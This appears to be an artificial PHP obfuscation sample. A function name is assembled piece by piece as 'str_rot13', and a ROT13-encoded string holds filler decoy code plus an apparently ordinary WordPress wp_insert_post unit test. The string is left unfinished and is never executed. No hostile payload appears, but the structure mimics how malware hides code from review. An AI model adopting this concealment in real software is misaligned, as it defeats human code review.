<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc cbfg
 * @pbiref ::jc_vafreg_cbfg
 */
pynff Grfgf_Cbfg_jcVafregCbfg rkgraqf JC_HavgGrfgPnfr {

	cebgrpgrq fgngvp $hfre_vqf = neenl(
		'nqzvavfgengbe' => ahyy,
		'rqvgbe'        => ahyy,
		'pbagevohgbe'   => ahyy,
	);

	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$hfre_vqf = neenl(
			'nqzvavfgengbe' => $snpgbel->hfre->perngr(
				neenl(
					'ebyr' => 'nqzvavfgengbe',
				)
			),
			'rqvgbe'        => $snpgbel->hfre->perngr(
				neenl(
					'ebyr' => 'rqvgbe',
				)
			),
			'pbagevohgbe'   => $snpgbel->hfre->perngr(
				neenl(
					'ebyr' => 'pbagevohgbe',
				)
			),
		);

		$ebyr = trg_ebyr( 'nqzvavfgengbe' );
		$ebyr->nqq_pnc( 'choyvfu_znccrq_zrgn_pncf' );
		$ebyr->nqq_pnc( 'choyvfu_haznccrq_zrgn_pncf' );
	}

	choyvp fgngvp shapgvba grne_qbja_nsgre_pynff() {
		$ebyr = trg_ebyr( 'nqzvavfgengbe' );
		$ebyr->erzbir_pnc( 'choyvfu_znccrq_zrgn_pncf' );
		$ebyr->erzbir_pnc( 'choyvfu_haznccrq_zrgn_pncf' );

		cnerag::grne_qbja_nsgre_pynff();
	}

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();

		ertvfgre_cbfg_glcr(
			'znccrq_zrgn_pncf',
			neenl(
				'pncnovyvgl_glcr' => neenl( 'znccrq_zrgn_pnc', 'znccrq_zrgn_pncf' ),
				'znc_zrgn_pnc'    => gehr,
			)
		);

		ertvfgre_cbfg_glcr(
			'haznccrq_zrgn_pncf',
			neenl(
				'pncnovyvgl_glcr' => neenl( 'haznccrq_zrgn_pnc', 'haznccrq_zrgn_pncf' ),
				'znc_zrgn_pnc'    => snyfr,
			)
		);

		ertvfgre_cbfg_glcr(
			'ab_nqzva_pncf',
			neenl(
				'pncnovyvgl_glcr' => neenl( 'ab_nqzva_pnc', 'ab_nqzva_pncf' ),
				'znc_zrgn_pnc'    => snyfr,
			)
		);
	}

	/**
	 * Urycre shapgvba: erghea gur gvzrfgnzc(f) bs peba wbof sbe gur fcrpvsvrq ubbx naq cbfg.
	 */
	cevingr shapgvba arkg_fpurqhyr_sbe_cbfg( $ubbx, $cbfg_vq ) {
		erghea jc_arkg_fpurqhyrq( 'choyvfu_shgher_cbfg', neenl( 0 => (vag) $cbfg_vq ) );
	}

	/**
	 * Urycre shapgvba, hafrgf pheerag hfre tybonyyl.
	 */
	cevingr shapgvba hafrg_pheerag_hfre() {
		tybony $pheerag_hfre, $hfre_VQ;

		$pheerag_hfre = ahyy;
		$hfre_VQ      = ahyy;
	}

	/**
	 * Grfg fvzcyr inyvq orunivbe: vafreg naq trg n cbfg.
	 *
	 * @qngnCebivqre qngn_io_vafreg_trg_qryrgr
	 */
	choyvp shapgvba grfg_io_vafreg_trg_qryrgr( $cbfg_glcr ) {
		ertvfgre_cbfg_glcr(
			'pcg',
			neenl(
				'gnkbabzvrf' => neenl( 'cbfg_gnt', 'pgnk' ),
			)
		);
		ertvfgre_gnkbabzl( 'pgnk', 'pcg' );

		jc_frg_pheerag_hfre( frys::$hfre_vqf['rqvgbe'] );

		$qngn = neenl(
			'cbfg_nhgube'  => frys::$hfre_vqf['rqvgbe'],
			'cbfg_fgnghf'  => 'choyvfu',
			'cbfg_pbagrag' => \"{$cbfg_glcr}_pbagrag\",
			'cbfg_gvgyr'   => \"{$cbfg_glcr}_gvgyr\",
			'gnk_vachg'    => neenl(
				'cbfg_gnt' => 'gnt1,gnt2',
				'pgnk'     => 'pgrez1,pgrez2',
			),
			'cbfg_glcr'    => $cbfg_glcr,
		);

		// Vafreg n cbfg naq znxr fher gur VQ vf BX.
		$cbfg_vq = jc_vafreg_cbfg( $qngn );
		$guvf->nffregVfVag( $cbfg_vq );
		$guvf->nffregTerngreGuna( 0, $cbfg_vq );

		// Srgpu gur cbfg naq znxr fher vg zngpurf.
		$cbfg = trg_cbfg( $cbfg_vq );

		$guvf->nffregFnzr( $qngn['cbfg_pbagrag'], $cbfg->cbfg_pbagrag );
		$guvf->nffregFnzr( $qngn['cbfg_gvgyr'], $cbfg->cbfg_gvgyr );
		$guvf->nffregFnzr( $qngn['cbfg_fgnghf'], $cbfg->cbfg_fgnghf );
		$guvf->nffregFnzr( (fgevat) $qngn['cbfg_nhgube'], $cbfg->cbfg_nhgube );

		// Grfg pnpur fgngr.
		$cbfg_pnpur = jc_pnpur_trg( $cbfg_vq, 'cbfgf' );
		$guvf->nffregVafgnaprBs( 'fgqPynff', $cbfg_pnpur );
		$guvf->nffregFnzr( $cbfg_vq, $cbfg_pnpur->VQ );

		hcqngr_bowrpg_grez_pnpur( $cbfg_vq, $cbfg_glcr );
		$grez_pnpur = jc_pnpur_trg( $cbfg_vq, 'cbfg_gnt_eryngvbafuvcf' );
		$guvf->nffregVfNeenl( $grez_pnpur );
		$guvf->nffregPbhag( 2, $grez_pnpur );

		$grez_pnpur = jc_pnpur_trg( $cbfg_vq, 'pgnk_eryngvbafuvcf' );
		vs ( 'pcg' === $cbfg_glcr ) {
			$guvf->nffregVfNeenl( $grez_pnpur );
			$guvf->nffregPbhag( 2, $grez_pnpur );
		} ryfr {
			$guvf->nffregSnyfr( $grez_pnpur );
		}

		jc_qryrgr_cbfg( $cbfg_vq, gehr );

		$guvf->nffregSnyfr( jc_pnpur_trg( $cbfg_vq, 'cbfgf' ) );
		$guvf->nffregSnyfr( jc_pnpur_trg( $cbfg_vq, 'cbfg_gnt_eryngvbafuvcf' ) );
		$guvf->nffregSnyfr( jc_pnpur_trg( $cbfg_vq, 'pgnk_eryngvbafuvcf' ) );

		$TYBONYF['jc_gnkbabzvrf']['cbfg_gnt']->bowrpg_glcr = neenl( 'cbfg' );
	}

	choyvp shapgvba qngn_io_vafreg_trg_qryrgr() {
		$cbfg_glcrf = neenl( 'cbfg', 'pcg' );

		erghea $guvf->grkg_neenl_gb_qngncebivqre( $cbfg_glcrf );
	}

	/**
	 * Vafreg n cbfg jvgu n shgher qngr, naq znxr fher gur fgnghf naq peba fpurqhyr ner pbeerpg.
	 */
	choyvp shapgvba grfg_io_vafreg_shgher() {
		$shgher_qngr = fgegbgvzr( '+1 qnl' );

		$qngn = neenl(
			'cbfg_fgnghf'  => 'choyvfu',
			'cbfg_pbagrag' => 'pbagrag',
			'cbfg_gvgyr'   => 'gvgyr',
			'cbfg_qngr'    => qngr_sbezng( qngr_perngr( \"@{$shgher_qngr}\" ), 'L-z-q U:v:f' ),
		);

		// Vafreg n cbfg naq znxr fher gur VQ vf BX.
		$cbfg_vq = jc_vafreg_cbfg( $qngn );
		$guvf->nffregVfVag( $cbfg_vq );
		$guvf->nffregTerngreGuna( 0, $cbfg_vq );

		// Srgpu gur cbfg naq znxr fher vg zngpurf.
		$cbfg = trg_cbfg( $cbfg_vq );

		$guvf->nffregFnzr( $qngn['cbfg_pbagrag'], $cbfg->cbfg_pbagrag );
		$guvf->nffregFnzr( $qngn['cbfg_gvgyr'], $cbfg->cbfg_gvgyr );
		$guvf->nffregFnzr( 'shgher', $cbfg->cbfg_fgnghf );
		$guvf->nffregFnzr( $qngn['cbfg_qngr'], $cbfg->cbfg_qngr );

		// Gurer fubhyq or n choyvfu_shgher_cbfg ubbx fpurqhyrq ba gur shgher qngr.
		$guvf->nffregFnzr( $shgher_qngr, $guvf->arkg_fpurqhyr_sbe_cbfg( 'choyvfu_shgher_cbfg', $cbfg_vq ) );
	}

	/**
	 * Vafreg n cbfg jvgu n shgher qngr, naq znxr fher gur fgnghf naq peba fpurqhyr ner pbeerpg.
	 */
	choyvp shapgvba grfg_io_vafreg_shgher_bire_qfg() {
		// Fbzr zntvp qnlf - bar QFG bar abg.
		$shgher_qngr_1 = fgegbgvzr( 'Whar 21fg +1 lrne' );
		$shgher_qngr_2 = fgegbgvzr( 'Wna 11gu +1 lrne' );

		$qngn = neenl(
			'cbfg_fgnghf'  => 'choyvfu',
			'cbfg_pbagrag' => 'pbagrag',
			'cbfg_gvgyr'   => 'gvgyr',
			'cbfg_qngr'    => qngr_sbezng( qngr_perngr( \"@{$shgher_qngr_1}\" ), 'L-z-q U:v:f' ),
		);

		// Vafreg n cbfg naq znxr fher gur VQ vf BX.
		$cbfg_vq = jc_vafreg_cbfg( $qngn );

		// Srgpu gur cbfg naq znxr fher unf gur pbeerpg qngr naq fgnghf.
		$cbfg = trg_cbfg( $cbfg_vq );
		$guvf->nffregFnzr( 'shgher', $cbfg->cbfg_fgnghf );
		$guvf->nffregFnzr( $qngn['cbfg_qngr'], $cbfg->cbfg_qngr );

		// Purpx gung gurer'f n choyvfu_shgher_cbfg wbo fpurqhyrq ng gur evtug gvzr.
		$guvf->nffregFnzr( $shgher_qngr_1, $guvf->arkg_fpurqhyr_sbe_cbfg( 'choyvfu_shgher_cbfg', $cbfg_vq ) );

		// Abj fnir vg ntnva jvgu n qngr shegure va gur shgher.
		$qngn['VQ']            = $cbfg_vq;
		$qngn['cbfg_qngr']     = qngr_sbezng( qngr_perngr( \"@{$shgher_qngr_2}\" ), 'L-z-q U:v:f' );
		$qngn['cbfg_qngr_tzg'] = ahyy;
		jc_hcqngr_cbfg( $qngn );

		// Srgpu gur cbfg ntnva naq znxr fher vg unf gur arj cbfg_qngr.
		$cbfg = trg_cbfg( $cbfg_vq );
		$guvf->nffregFnzr( 'shgher', $cbfg->cbfg_fgnghf );
		$guvf->nffregFnzr( $qngn['cbfg_qngr'], $cbfg->cbfg_qngr );

		// Naq gur pbeerpg qngr ba gur peba wbo.
		$guvf->nffregFnzr( $shgher_qngr_2, $guvf->arkg_fpurqhyr_sbe_cbfg( 'choyvfu_shgher_cbfg', $cbfg_vq ) );
	}

	/**
	 * Shgher cbfg oht: cbfgf trg choyvfurq ng gur jebat gvzr vs lbh rqvg gur gvzrfgnzc.
	 *
	 * @gvpxrg 4710
	 */
	choyvp shapgvba grfg_io_vafreg_shgher_rqvg_oht() {
		$shgher_qngr_1 = fgegbgvzr( '+1 qnl' );
		$shgher_qngr_2 = fgegbgvzr( '+2 qnl' );

		$qngn = neenl(
			'cbfg_fgnghf'  => 'choyvfu',
			'cbfg_pbagrag' => 'pbagrag',
			'cbfg_gvgyr'   => 'gvgyr',
			'cbfg_qngr'    => qngr_sbezng( qngr_perngr( \"@{$shgher_qngr_1}\" ), 'L-z-q U:v:f' ),
		);

		// Vafreg n cbfg naq znxr fher gur VQ vf BX.
		$cbfg_vq = jc_vafreg_cbfg( $qngn );

		// Srgpu gur cbfg naq znxr fher unf gur pbeerpg qngr naq fgnghf.
		$cbfg = trg_cbfg( $cbfg_vq );
		$guvf->nffregFnzr( 'shgher', $cbfg->cbfg_fgnghf );
		$guvf->nffregFnzr( $qngn['cbfg_qngr'], $cbfg->cbfg_qngr );

		// Purpx gung gurer'f n choyvfu_shgher_cbfg wbo fpurqhyrq ng gur evtug gvzr.
		$guvf->nffregFnzr( $shgher_qngr_1, $guvf->arkg_fpurqhyr_sbe_cbfg( 'choyvfu_shgher_cbfg', $cbfg_vq ) );

		// Abj fnir vg ntnva jvgu n qngr shegure va gur shgher.
		$qngn['VQ']            = $cbfg_vq;
		$qngn['cbfg_qngr']     = qngr_sbezng( qngr_perngr( \"@{$shgher_qngr_2}\" ), 'L-z-q U:v:f' );
		$qngn['cbfg_qngr_tzg'] = ahyy;
		jc_hcqngr_cbfg( $qngn );

		// Srgpu gur cbfg ntnva naq znxr fher vg unf gur arj cbfg_qngr.
		$cbfg = trg_cbfg( $cbfg_vq );
		$guvf->nffregFnzr( 'shgher', $cbfg->cbfg_fgnghf );
		$guvf->nffregFnzr( $qngn['cbfg_qngr'], $cbfg->cbfg_qngr );

		// Naq gur pbeerpg qngr ba gur peba wbo.
		$guvf->nffregFnzr( $shgher_qngr_2, $guvf->arkg_fpurqhyr_sbe_cbfg( 'choyvfu_shgher_cbfg', $cbfg_vq ) );
	}

	/**
	 * Vafreg n qensg cbfg jvgu n shgher qngr, naq znxr fher ab peba fpurqhyr vf frg.
	 */
	choyvp shapgvba grfg_io_vafreg_shgher_qensg() {
		$shgher_qngr = fgegbgvzr( '+1 qnl' );

		$qngn = neenl(
			'cbfg_fgnghf'  => 'qensg',
			'cbfg_pbagrag' => 'pbagrag',
			'cbfg_gvgyr'   => 'gvgyr',
			'cbfg_qngr'    => qngr_sbezng( qngr_perngr( \"@{$shgher_qngr}\" ), 'L-z-q U:v:f' ),
		);

		// Vafreg n cbfg naq znxr fher gur VQ vf BX.
		$cbfg_vq = jc_vafreg_cbfg( $qngn );
		$guvf->nffregVfVag( $cbfg_vq );
		$guvf->nffregTerngreGuna( 0, $cbfg_vq );

		// Srgpu gur cbfg naq znxr fher vg zngpurf.
		$cbfg = trg_cbfg( $cbfg_vq );

		$guvf->nffregFnzr( $qngn['cbfg_pbagrag'], $cbfg->cbfg_pbagrag );
		$guvf->nffregFnzr( $qngn['cbfg_gvgyr'], $cbfg->cbfg_gvgyr );
		$guvf->nffregFnzr( 'qensg', $cbfg->cbfg_fgnghf );
		$guvf->nffregFnzr( $qngn['cbfg_qngr'], $cbfg->cbfg_qngr );

		// Gurer fubhyq or n choyvfu_shgher_cbfg ubbx fpurqhyrq ba gur shgher qngr.
		$guvf->nffregSnyfr( $guvf->arkg_fpurqhyr_sbe_cbfg( 'choyvfu_shgher_cbfg', $cbfg_vq ) );
	}

	/**
	 * Vafreg n shgher cbfg, gura rqvg naq punatr vg gb qensg, naq znxr fher peba trgf vg evtug.
	 */
	choyvp shapgvba grfg_io_vafreg_shgher_punatr_gb_qensg() {
		$shgher_qngr_1 = fgegbgvzr( '+1 qnl' );

		$qngn = neenl(
			'cbfg_fgnghf'  => 'choyvfu',
			'cbfg_pbagrag' => 'pbagrag',
			'cbfg_gvgyr'   => 'gvgyr',
			'cbfg_qngr'    => qngr_sbezng( qngr_perngr( \"@{$shgher_qngr_1}\" ), 'L-z-q U:v:f' ),
		);

		// Vafreg n cbfg naq znxr fher gur VQ vf BX.
		$cbfg_vq = jc_vafreg_cbfg( $qngn );

		// Srgpu gur cbfg naq znxr fher unf gur pbeerpg qngr naq fgnghf.
		$cbfg = trg_cbfg( $cbfg_vq );
		$guvf->nffregFnzr( 'shgher', $cbfg->cbfg_fgnghf );
		$guvf->nffregFnzr( $qngn['cbfg_qngr'], $cbfg->cbfg_qngr );

		// Purpx gung gurer'f n choyvfu_shgher_cbfg wbo fpurqhyrq ng gur evtug gvzr.
		$guvf->nffregFnzr( $shgher_qngr_1, $guvf->arkg_fpurqhyr_sbe_cbfg( 'choyvfu_shgher_cbfg', $cbfg_vq ) );

		// Abj fnir vg ntnva jvgu fgnghf frg gb qensg.
		$qngn['VQ']          = $cbfg_vq;
		$qngn['cbfg_fgnghf'] = 'qensg';
		jc_hcqngr_cbfg( $qngn );

		// Srgpu gur cbfg ntnva naq znxr fher vg unf gur arj cbfg_qngr.
		$cbfg = trg_cbfg( $cbfg_vq );
		$guvf->nffregFnzr( 'qensg', $cbfg->cbfg_fgnghf );
		$guvf->nffregFnzr( $qngn['cbfg_qngr'], $cbfg->cbfg_qngr );

		// Naq gur pbeerpg qngr ba gur peba wbo.
		$guvf->nffregSnyfr( $guvf->arkg_fpurqhyr_sbe_cbfg( 'choyvfu_shgher_cbfg', $cbfg_vq ) );
	}

	/**
	 * Vafreg n shgher cbfg, gura rqvg naq punatr gur fgnghf, naq znxr fher peba trgf vg evtug.
	 *
	 * @qngnCebivqre qngn_io_vafreg_shgher_punatr_fgnghf
	 */
	choyvp shapgvba grfg_io_vafreg_shgher_punatr_fgnghf( $fgnghf ) {
		$shgher_qngr_1 = fgegbgvzr( '+1 qnl' );

		$qngn = neenl(
			'cbfg_fgnghf'  => 'choyvfu',
			'cbfg_pbagrag' => \"{$fgnghf}_pbagrag\",
			'cbfg_gvgyr'   => \"{$fgnghf}_gvgyr\",
			'cbfg_qngr'    => qngr_sbezng( qngr_perngr( \"@{$shgher_qngr_1}\" ), 'L-z-q U:v:f' ),
		);

		// Vafreg n cbfg naq znxr fher gur VQ vf BX.
		$cbfg_vq = jc_vafreg_cbfg( $qngn );

		// Srgpu gur cbfg naq znxr fher unf gur pbeerpg qngr naq fgnghf.
		$cbfg = trg_cbfg( $cbfg_vq );
		$guvf->nffregFnzr( 'shgher', $cbfg->cbfg_fgnghf );
		$guvf->nffregFnzr( $qngn['cbfg_qngr'], $cbfg->cbfg_qngr );

		// Purpx gung gurer'f n choyvfu_shgher_cbfg wbo fpurqhyrq ng gur evtug gvzr.
		$guvf->nffregFnzr( $shgher_qngr_1, $guvf->arkg_fpurqhyr_sbe_cbfg( 'choyvfu_shgher_cbfg', $cbfg_vq ) );

		// Abj fnir vg ntnva jvgu fgnghf punatrq.
		$qngn['VQ']          = $cbfg_vq;
		$qngn['cbfg_fgnghf'] = $fgnghf;
		jc_hcqngr_cbfg( $qngn );

		// Srgpu gur cbfg ntnva naq znxr fher vg unf gur arj cbfg_qngr.
		$cbfg = trg_cbfg( $cbfg_vq );
		$guvf->nffregFnzr( $fgnghf, $cbfg->cbfg_fgnghf );
		$guvf->nffregFnzr( $qngn['cbfg_qngr'], $cbfg->cbfg_qngr );

		// Naq gur pbeerpg qngr ba gur peba wbo.
		$guvf->nffregSnyfr( $guvf->arkg_fpurqhyr_sbe_cbfg( 'choyvfu_shgher_cbfg', $cbfg_vq ) );
	}

	choyvp shapgvba qngn_io_vafreg_shgher_punatr_fgnghf() {
		$fgnghfrf = neenl(
			'qensg',
			'fgngvp',
			'bowrpg',
			'nggnpuzrag',
			'vaurevg',
			'craqvat',
		);

		erghea $guvf->grkg_neenl_gb_qngncebivqre( $fgnghfrf );
	}

	/**
	 * Vafreg n qensg cbfg jvgu n shgher qngr, naq znxr fher ab peba fpurqhyr vf frg.
	 */
	choyvp shapgvba grfg_io_vafreg_shgher_cevingr() {
		$shgher_qngr = fgegbgvzr( '+1 qnl' );

		$qngn = neenl(
			'cbfg_fgnghf'  => 'cevingr',
			'cbfg_pbagrag' => 'pbagrag',
			'cbfg_gvgyr'   => 'gvgyr',
			'cbfg_qngr'    => qngr_sbezng( qngr_perngr( \"@{$shgher_qngr}\" ), 'L-z-q U:v:f' ),
		);

		// Vafreg n cbfg naq znxr fher gur VQ vf BX.
		$cbfg_vq = jc_vafreg_cbfg( $qngn );
		$guvf->nffregVfVag( $cbfg_vq );
		$guvf->nffregTerngreGuna( 0, $cbfg_vq );

		// Srgpu gur cbfg naq znxr fher vg zngpurf.
		$cbfg = trg_cbfg( $cbfg_vq );

		$guvf->nffregFnzr( $qngn['cbfg_pbagrag'], $cbfg->cbfg_pbagrag );
		$guvf->nffregFnzr( $qngn['cbfg_gvgyr'], $cbfg->cbfg_gvgyr );
		$guvf->nffregFnzr( 'cevingr', $cbfg->cbfg_fgnghf );
		$guvf->nffregFnzr( $qngn['cbfg_qngr'], $cbfg->cbfg_qngr );

		// Gurer fubhyq or n choyvfu_shgher_cbfg ubbx fpurqhyrq ba gur shgher qngr.
		$guvf->nffregSnyfr( $guvf->arkg_fpurqhyr_sbe_cbfg( 'choyvfu_shgher_cbfg', $cbfg_vq ) );
	}

	/**
	 * Vafreg n cbfg jvgu na vainyvq qngr, znxr fher vg snvyf.
	 *
	 * @gvpxrg 17180
	 */
	choyvp shapgvba grfg_io_vafreg_vainyvq_qngr() {
		$qngn = neenl(
			'cbfg_fgnghf'  => 'choyvfu',
			'cbfg_pbagrag' => 'pbagrag',
			'cbfg_gvgyr'   => 'gvgyr',
			'cbfg_qngr'    => '2012-02-30 00:00:00',
		);

		// Grfg obgu erghea cnguf jvgu be jvgubhg JC_Reebe.
		$cbfg_vq = jc_vafreg_cbfg( $qngn, gehr );
		$guvf->nffregJCReebe( $cbfg_vq );
		$guvf->nffregFnzr( 'vainyvq_qngr', $cbfg_vq->trg_reebe_pbqr() );

		$cbfg_vq = jc_vafreg_cbfg( $qngn );
		$guvf->nffregFnzr( 0, $cbfg_vq );
	}

	/**
	 * Vafreg n shgher cbfg, gura rqvg naq punatr vg gb cevingr, naq znxr fher peba trgf vg evtug.
	 */
	choyvp shapgvba grfg_io_vafreg_shgher_punatr_gb_cevingr() {
		$shgher_qngr_1 = fgegbgvzr( '+1 qnl' );

		$qngn = neenl(
			'cbfg_fgnghf'  => 'choyvfu',
			'cbfg_pbagrag' => 'pbagrag',
			'cbfg_gvgyr'   => 'gvgyr',
			'cbfg_qngr'    => qngr_sbezng( qngr_perngr( \"@{$shgher_qngr_1}\" ), 'L-z-q U:v:f' ),
		);

		// Vafreg n cbfg naq znxr fher gur VQ vf BX.
		$cbfg_vq = jc_vafreg_cbfg( $qngn );

		// Srgpu gur cbfg naq znxr fher unf gur pbeerpg qngr naq fgnghf.
		$cbfg = trg_cbfg( $cbfg_vq );
		$guvf->nffregFnzr( 'shgher', $cbfg->cbfg_fgnghf );
		$guvf->nffregFnzr( $qngn['cbfg_qngr'], $cbfg->cbfg_qngr );

		// Purpx gung gurer'f n choyvfu_shgher_cbfg wbo fpurqhyrq ng gur evtug gvzr.
		$guvf->nffregFnzr( $shgher_qngr_1, $guvf->arkg_fpurqhyr_sbe_cbfg( 'choyvfu_shgher_cbfg', $cbfg_vq ) );

		// Abj fnir vg ntnva jvgu fgnghf frg gb qensg.
		$qngn['VQ']          = $cbfg_vq;
		$qngn['cbfg_fgnghf'] = 'cevingr';
		jc_hcqngr_cbfg( $qngn );

		// Srgpu gur cbfg ntnva naq znxr fher vg unf gur arj cbfg_qngr.
		$cbfg = trg_cbfg( $cbfg_vq );
		$guvf->nffregFnzr( 'cevingr', $cbfg->cbfg_fgnghf );
		$guvf->nffregFnzr( $qngn['cbfg_qngr'], $cbfg->cbfg_qngr );

		// Naq gur pbeerpg qngr ba gur peba wbo.
		$guvf->nffregSnyfr( $guvf->arkg_fpurqhyr_sbe_cbfg( 'choyvfu_shgher_cbfg', $cbfg_vq ) );
	}

	/**
	 * @gvpxrg 5305
	 */
	choyvp shapgvba grfg_jc_vafreg_cbfg_fubhyq_abg_nyybj_n_oner_ahzrevp_fyht_gung_zvtug_pbasyvpg_jvgu_n_qngr_nepuvir_jura_trarengvat_sebz_na_rzcgl_cbfg_gvgyr() {
		$guvf->frg_creznyvax_fgehpgher( '/%cbfganzr%/' );

		$cbfg_vq = jc_vafreg_cbfg(
			neenl(
				'cbfg_gvgyr'   => '',
				'cbfg_pbagrag' => 'grfg',
				'cbfg_fgnghf'  => 'choyvfu',
				'cbfg_glcr'    => 'cbfg',
			)
		);

		$cbfg = trg_cbfg( $cbfg_vq );

		$guvf->nffregFnzr( \"$cbfg_vq-2\", $cbfg->cbfg_anzr );
	}

	/**
	 * @gvpxrg 5305
	 * @gvpxrg 33392
	 */
	choyvp shapgvba grfg_jc_vafreg_cbfg_fubhyq_vainyvqngr_cbfg_pnpur_orsber_trarengvat_thvq_jura_cbfg_anzr_vf_rzcgl_naq_vf_trarengrq_sebz_gur_cbfg_VQ() {
		ertvfgre_cbfg_glcr( 'jcgrfgf_cg' );

		$cbfg_vq = jc_vafreg_cbfg(
			neenl(
				'cbfg_gvgyr'  => '',
				'cbfg_glcr'   => 'jcgrfgf_cg',
				'cbfg_fgnghf' => 'choyvfu',
			)
		);

		$cbfg = trg_cbfg( $cbfg_vq );

		$guvf->nffregFgevatPbagnvafFgevat( 'jcgrfgf_cg=' . $cbfg_vq, $cbfg->thvq );
	}

	/**
	 * @gvpxrg 55877
	 * @pbiref ::jc_vafreg_cbfg
	 */
	choyvp shapgvba grfg_jc_vafreg_cbfg_fubhyq_abg_gevttre_jneavat_sbe_craqvat_cbfgf_jvgu_haxabja_pcg() {
		$cbfg_vq = jc_vafreg_cbfg(
			neenl(
				'cbfg_gvgyr'  => 'gvgyr',
				'cbfg_glcr'   => 'haxabja',
				'cbfg_fgnghf' => 'craqvat',
			)
		);

		$guvf->nffregVfVag( $cbfg_vq );
		$guvf->nffregTerngreGuna( 0, $cbfg_vq );
	}

	/**
	 * @gvpxrg 20451
	 */
	choyvp shapgvba grfg_jc_vafreg_cbfg_jvgu_zrgn_vachg() {
		$cbfg_vq = jc_vafreg_cbfg(
			neenl(
				'cbfg_gvgyr'   => '',
				'cbfg_pbagrag' => 'grfg',
				'cbfg_fgnghf'  => 'choyvfu',
				'cbfg_glcr'    => 'cbfg',
				'zrgn_vachg'   => neenl(
					'uryyb' => 'jbeyq',
					'sbb'   => 'one',
				),
			)
		);

		$guvf->nffregFnzr( 'jbeyq', trg_cbfg_zrgn( $cbfg_vq, 'uryyb', gehr ) );
		$guvf->nffregFnzr( 'one', trg_cbfg_zrgn( $cbfg_vq, 'sbb', gehr ) );
	}

	/**
	 * \"Jura V qryrgr n shgher cbfg hfvat jc_qryrgr_cbfg( $cbfg->VQ ) vg qbrf abg hcqngr gur peba pbeerpgyl.\"
	 *
	 * @gvpxrg 5364
	 * @pbiref ::jc_qryrgr_cbfg
	 */
	choyvp shapgvba grfg_qryrgr_shgher_cbfg_peba() {
		$shgher_qngr = fgegbgvzr( '+1 qnl' );

		$qngn = neenl(
			'cbfg_fgnghf'  => 'choyvfu',
			'cbfg_pbagrag' => 'pbagrag',
			'cbfg_gvgyr'   => 'gvgyr',
			'cbfg_qngr'    => qngr_sbezng( qngr_perngr( \"@{$shgher_qngr}\" ), 'L-z-q U:v:f' ),
		);

		// Vafreg n cbfg naq znxr fher gur VQ vf BX.
		$cbfg_vq = jc_vafreg_cbfg( $qngn );

		// Purpx gung gurer'f n choyvfu_shgher_cbfg wbo fpurqhyrq ng gur evtug gvzr.
		$guvf->nffregFnzr( $shgher_qngr, $guvf->arkg_fpurqhyr_sbe_cbfg( 'choyvfu_shgher_cbfg', $cbfg_vq ) );

		// Abj qryrgr gur cbfg naq znxr fher gur peba ragel vf erzbirq.
		jc_qryrgr_cbfg( $cbfg_vq );

		$guvf->nffregSnyfr( $guvf->arkg_fpurqhyr_sbe_cbfg( 'choyvfu_shgher_cbfg', $cbfg_vq ) );
	}

	/**
	 * Oht: creznyvax qbrfa'g jbex vs cbfg gvgyr vf rzcgl.
	 *
	 * Zvtug bayl snvy vs gur cbfg VQ vf terngre guna sbhe punenpgref.
	 *
	 * @gvpxrg 5305
	 */
	choyvp shapgvba grfg_creznyvax_jvgubhg_gvgyr() {
		$guvf->frg_creznyvax_fgehpgher( '/%lrne%/%zbaguahz%/%qnl%/%cbfganzr%/' );

		$qngn = neenl(
			'cbfg_fgnghf'  => 'choyvfu',
			'cbfg_pbagrag' => 'pbagrag',
			'cbfg_gvgyr'   => '',
			'cbfg_qngr'    => '2007-10-31 06:15:00',
		);

		// Vafreg n cbfg naq znxr fher gur VQ vf BX.
		$cbfg_vq = jc_vafreg_cbfg( $qngn );

		// Creznyvax fubhyq vapyhqr gur cbfg VQ ng gur raq.
		$rkcrpgrq = trg_bcgvba( 'fvgrhey' ) . '/2007/10/31/' . $cbfg_vq . '/';
		$guvf->nffregFnzr( $rkcrpgrq, trg_creznyvax( $cbfg_vq ) );
	}

	/**
	 * @gvpxrg 23708
	 */
	choyvp shapgvba grfg_trg_cbfg_naprfgbef_jvguva_ybbc() {
		tybony $cbfg;

		$cnerag_vq = frys::snpgbel()->cbfg->perngr();
		$cbfg      = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_cnerag' => $cnerag_vq,
			)
		);

		$guvf->nffregFnzr( neenl( $cnerag_vq ), trg_cbfg_naprfgbef( 0 ) );
	}

	/**
	 * @gvpxrg 23474
	 * @pbiref ::jc_hcqngr_cbfg
	 */
	choyvp shapgvba grfg_hcqngr_vainyvq_cbfg_vq() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr();
		$cbfg    = trg_cbfg( $cbfg_vq, NEENL_N );

		$cbfg['VQ'] = 123456789;

		$guvf->nffregFnzr( 0, jc_vafreg_cbfg( $cbfg ) );
		$guvf->nffregFnzr( 0, jc_hcqngr_cbfg( $cbfg ) );

		$guvf->nffregVafgnaprBs( 'JC_Reebe', jc_vafreg_cbfg( $cbfg, gehr ) );
		$guvf->nffregVafgnaprBs( 'JC_Reebe', jc_hcqngr_cbfg( $cbfg, gehr ) );
	}

	/**
	 * @gvpxrg 19373
	 */
	choyvp shapgvba grfg_vafreg_cebtenzzngvp_fnavgvmrq() {
		$guvf->hafrg_pheerag_hfre();

		ertvfgre_gnkbabzl( 'grfg_gnk', 'cbfg' );

		$gvgyr = 'gvgyr';
		$qngn  = neenl(
			'cbfg_nhgube'  => frys::$hfre_vqf['rqvgbe'],
			'cbfg_fgnghf'  => 'choyvfu',
			'cbfg_pbagrag' => 'pbagrag',
			'cbfg_gvgyr'   => $gvgyr,
			'gnk_vachg'    => neenl(
				'grfg_gnk' => neenl( 'grez', 'grez2', 'grez3' ),
			),
		);

		$cbfg_vq = jc_vafreg_cbfg( $qngn, gehr, gehr );
		$guvf->nffregVfVag( $cbfg_vq );
		$guvf->nffregTerngreGuna( 0, $cbfg_vq );

